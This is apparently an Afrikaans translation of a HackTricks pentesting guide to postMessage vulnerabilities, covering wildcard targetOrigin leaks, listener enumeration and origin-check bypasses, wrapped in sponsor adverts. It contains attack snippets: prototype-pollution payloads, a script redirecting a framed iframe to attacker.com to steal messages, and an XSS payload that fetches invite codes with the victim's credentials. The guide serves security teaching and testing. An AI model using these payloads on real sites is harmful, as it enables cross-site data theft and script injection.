# PostMessage Kwesbaarhede

## PostMessage Kwesbaarhede

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) is 'n **dark-web** aangedrewe soekenjin wat **gratis** funksies bied om te kontroleer of 'n maatskappy of sy kli√´nte **gekompromiteer** is deur **stealer malware**.

Die prim√™re doel van WhiteIntel is om rekening-oorneemings en lospryse-aanvalle te beveg wat voortspruit uit inligtingsteel-malware.

Jy kan hul webwerf besoek en hul enjin vir **gratis** probeer by:

{% embed url="https://whiteintel.io" %}

***

## Stuur **PostMessage**

**PostMessage** gebruik die volgende funksie om 'n boodskap te stuur:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Let wel dat **targetOrigin** 'n '\*' kan wees of 'n URL soos _https://company.com._\
In die **tweede scenario** kan die **boodskap slegs na daardie domein gestuur word** (selfs as die oorsprong van die vensterobjek anders is).\
As die **wildcard** gebruik word, kan **boodskappe na enige domein gestuur word**, en sal dit na die oorsprong van die vensterobjek gestuur word.

### Aanval op iframe & wildcard in **targetOrigin**

Soos verduidelik in [**hierdie verslag**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) as jy 'n bladsy vind wat **ge√Øframe** kan word (geen `X-Frame-Header`-beskerming nie) en wat **sensitiewe** boodskappe stuur via **postMessage** deur 'n **wildcard** (\*), kan jy die **oorsprong** van die **iframe** **verander** en die **sensitiewe** boodskap na 'n domein wat deur jou beheer word, **lek**.\
Let daarop dat as die bladsy ge√Øframe kan word maar die **targetOrigin** is **ingestel op 'n URL en nie op 'n wildcard nie**, sal hierdie **truc nie werk nie**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener uitbuiting

**`addEventListener`** is die funksie wat deur JS gebruik word om die funksie te verklaar wat **`postMessages` verwag**.\
'n Kode soortgelyk aan die volgende een sal gebruik word:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Nota in hierdie geval hoe die **eerste ding** wat die kode doen, is om die **oorsprong te kontroleer**. Dit is vreeslik **belangrik** veral as die bladsy iets sensitiefs gaan doen met die ontvangste inligting (soos 'n wagwoord verander). **As dit nie die oorsprong kontroleer nie, kan aanvallers slagoffers maak om willekeurige data na hierdie eindpunte te stuur** en die slagoffers se wagwoorde te verander (in hierdie voorbeeld).

### Enumerasie

Om **gebeurtenisluisteraars te vind** op die huidige bladsy kan jy:

* **Soek** die JS-kode vir `window.addEventListener` en `$(window).on` (_JQuery weergawe_)
* **Voer uit** in die ontwikkelaarhulpmiddelskonsole: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **Gaan na** _Elemente --> Gebeurtenisluisteraars_ in die ontwikkelaarhulpmiddels van die webblaaier

![](<../../.gitbook/assets/image (396).png>)

* Gebruik 'n **webblaai-uitbreiding** soos [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) of [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Hierdie webblaai-uitbreidings sal **alle boodskappe onderskep** en aan jou wys.

### Oorsprongkontrole-omleidings

* Die **`event.isTrusted`** eienskap word as veilig beskou omdat dit slegs `True` teruggee vir gebeurtenisse wat deur egte gebruikersaksies gegenereer word. Alhoewel dit uitdagend is om te omseil as dit korrek ge√Ømplementeer is, is sy belangrikheid in sekuriteitskontroles merkwaardig.
* Die gebruik van **`indexOf()`** vir oorsprongvalidering in PostMessage-gebeurtenisse kan vatbaar wees vir omseiling. 'n Voorbeeld wat hierdie kwesbaarheid illustreer is:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* Die **`search()`** metode van `String.prototype.search()` is bedoel vir regul√™re uitdrukkings, nie vir strings nie. As iets anders as 'n regul√™re uitdrukking deurgegee word, lei dit tot implisiete omskakeling na 'n regul√™re uitdrukking, wat die metode potensieel onveilig maak. Dit is omdat in regul√™re uitdrukkings 'n punt (.) as 'n jokerteken optree, wat omseiling van validering met spesiaal ontwerpte domeine moontlik maak. Byvoorbeeld:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* Die **`match()`** funksie, soortgelyk aan `search()`, verwerk regul√™re uitdrukkings. As die regul√™re uitdrukking nie korrek gestruktureer is nie, kan dit vatbaar wees vir omseiling.
* Die **`escapeHtml`** funksie is bedoel om insette te saniteer deur karakters te ontsnap. Dit skep egter nie 'n nuwe ontsnapte objek nie, maar oorskryf die eienskappe van die bestaande objek. Hierdie gedrag kan uitgebuit word. Veral as 'n objek gemanipuleer kan word sodat sy beheerde eienskap nie `hasOwnProperty` erken nie, sal die `escapeHtml` nie soos verwag optree nie. Dit word gedemonstreer in die voorbeelde hieronder:

* Verwagte Mislukking:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
* Omseiling van die ontsnapping:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

In die konteks van hierdie kwesbaarheid is die `File` objek merkbaar vatbaar weens sy skryfbeskermde `name` eienskap. Hierdie eienskap, wanneer in templaat gebruik, word nie gesaniteer deur die `escapeHtml` funksie nie, wat tot potensi√´le sekuriteitsrisiko's kan lei.
* Die `document.domain` eienskap in JavaScript kan deur 'n skrip ingestel word om die domein te verkort, wat meer ontspanne selfde-oorsprongbeleidshandhawing binne dieselfde ouerdomein moontlik maak.

### e.origin == window.origin omseil

Wanneer 'n webbladsy ingebed word binne 'n **gesandboxte iframe** met behulp van %%%%%%, is dit belangrik om te verstaan dat die oorsprong van die iframe na nul gestel sal word. Dit is veral belangrik wanneer daar met **sandbox-eienskappe** gewerk word en hul implikasies vir sekuriteit en funksionaliteit.

Deur **`allow-popups`** in die sandbox-eienskap te spesifiseer, erf enige popup-venster wat van binne die iframe geopen word, die sandbox-beperkings van sy ouer. Dit beteken dat tensy die **`allow-popups-to-escape-sandbox`** eienskap ook ingesluit word, die oorsprong van die popup-venster ook na `nul` gestel word, wat ooreenstem met die oorsprong van die iframe.

Gevolglik, wanneer 'n popup onder hierdie omstandighede geopen word en 'n boodskap van die iframe na die popup gestuur word met behulp van **`postMessage`**, het beide die stuur- en ontvangsende kante hul oorsprong na `nul` gestel. Hierdie situasie lei tot 'n scenario waar **`e.origin == window.origin`** as waar evalueer (`null == null`), omdat beide die iframe en die popup dieselfde oorsprongwaarde van `nul` deel.

Vir meer inligting **lees**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Omseiling van e.source

Dit is moontlik om te kontroleer of die boodskap afkomstig is van dieselfde venster waarin die skrip luister (veral interessant vir **Inhoudskripte van webblaai-uitbreidings** om te kontroleer of die boodskap van dieselfde bladsy gestuur is):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Jy kan **`e.source`** van 'n boodskap dwing om nul te wees deur 'n **iframe** te skep wat die **postMessage** stuur en **onmiddellik verwyder**.

Vir meer inligting **lees:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header omseil

Om hierdie aanvalle uit te voer, sal jy idealiter die slagoffer-webbladsy binne 'n `iframe` kan plaas. Maar sommige koppe soos `X-Frame-Header` kan daardie **gedrag** **voorkom**.\
In daardie scenario's kan jy steeds 'n minder sluipende aanval gebruik. Jy kan 'n nuwe lappie oopmaak na die kwesbare webtoepassing en daarmee kommunikeer:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Steel boodskap gestuur aan kind deur die hoofbladsy te blokkeer

Op die volgende bladsy kan jy sien hoe jy 'n **sensitiewe postmessage data** gestuur aan 'n **kind iframe** kan steel deur die **hoof** bladsy te **blokkeer** voordat die data gestuur word en 'n **XSS in die kind** te misbruik om die data te **lek** voordat dit ontvang word:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Steel boodskap deur die iframe lokasie te wysig

As jy 'n webbladsy kan iframe sonder 'n X-Frame-Header wat 'n ander iframe bevat, kan jy die **lokasie van daardie kind iframe verander**, sodat as dit 'n **postmessage** ontvang wat gestuur is met 'n **wildcard**, kan 'n aanvaller daardie iframe **oorsprong** verander na 'n bladsy wat deur hom **beheer** word en die boodskap **steel**:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage na Prototipe Besoedeling en/of XSS

In scenario's waar die data gestuur deur `postMessage` uitgevoer word deur JS, kan jy die **bladsy iframe** en **misbruik** die **prototipe besoedeling/XSS** deur die aanval te stuur via `postMessage`.

'N Paar **baie goed verduidelikte XSS deur `postMessage` kan gevind word op [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Voorbeeld van 'n aanval om **Prototipe Besoedeling en dan XSS** te misbruik deur 'n `postMessage` na 'n `iframe` te stuur:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Vir **meer inligting**:

* Skakel na bladsy oor [**prototipe besoedeling**](../deserialization/nodejs-proto-prototype-pollution/)
* Skakel na bladsy oor [**XSS**](../xss-cross-site-scripting/)
* Skakel na bladsy oor [**kli√´ntkant prototipe besoedeling na XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Verwysings

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Om te oefen: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) is 'n **donker-web** aangedrewe soekenjin wat **gratis** funksies bied om te kontroleer of 'n maatskappy of sy kli√´nte deur **diefstal malware** is **gekompromiteer**.

Die prim√™re doel van WhiteIntel is om rekening-oorneem te bekamp en lospryse-aanvalle as gevolg van inligtingsteel-malware te voorkom.

Jy kan hul webwerf besoek en hul enjin vir **gratis** probeer by:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
